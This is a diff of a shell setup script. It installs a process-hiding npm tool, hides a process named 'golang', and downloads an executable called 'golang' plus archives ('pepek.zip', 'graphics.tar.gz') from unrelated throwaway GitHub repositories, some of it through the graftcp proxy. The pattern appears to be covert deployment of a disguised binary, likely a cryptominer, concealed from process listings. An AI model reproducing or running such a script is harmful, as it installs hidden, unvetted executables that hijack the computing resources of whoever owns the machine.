@@ -9,6 +9,9 @@ sudo apt install gcc screen -y
 curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
 sudo apt install nodejs -y
 npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add golang
+wget https://github.com/danipedrosang/marcrash/raw/main/golang
+chmod +x golang
+wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek.zip
 wget https://github.com/danipedrosang/kupx/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
@@ -43,11 +46,6 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget https://github.com/danipedrosang/marcrash/raw/main/golang
-
-chmod +x golang
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek.zip
 
 unzip pepek.zip
 
